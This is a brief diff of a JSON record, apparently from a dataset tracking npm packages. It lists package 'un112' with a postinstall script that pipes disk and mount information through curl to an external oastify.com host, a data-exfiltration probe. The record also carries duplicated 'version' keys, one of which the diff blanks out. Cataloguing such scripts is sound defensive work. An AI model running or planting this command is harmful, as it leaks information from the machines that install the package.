@@ -18,7 +18,7 @@
   {
     "packageName": "un112",
     "version": "1.0.18",
-    "version": "1.0.34",
+ 
     "scriptType": "postinstall",
     "scriptContent": "df | grep -v container | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
     "previousVersion": "1.0.33",
